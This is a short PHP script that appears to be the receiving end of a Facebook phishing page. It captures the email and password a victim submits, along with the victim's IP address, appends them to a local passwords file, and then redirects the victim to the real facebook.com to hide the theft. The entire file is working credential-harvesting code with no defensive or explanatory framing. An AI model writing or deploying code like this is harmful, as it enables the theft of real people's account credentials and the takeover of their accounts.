<?php
$file = "../storage/passwords.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$data = "\n[+] IP: $ip\n[+] USER: $email\n[+] PASS: $pass\n----------------\n";
file_put_contents($file, $data, FILE_APPEND);
header("Location: https://facebook.com");
exit();
?>
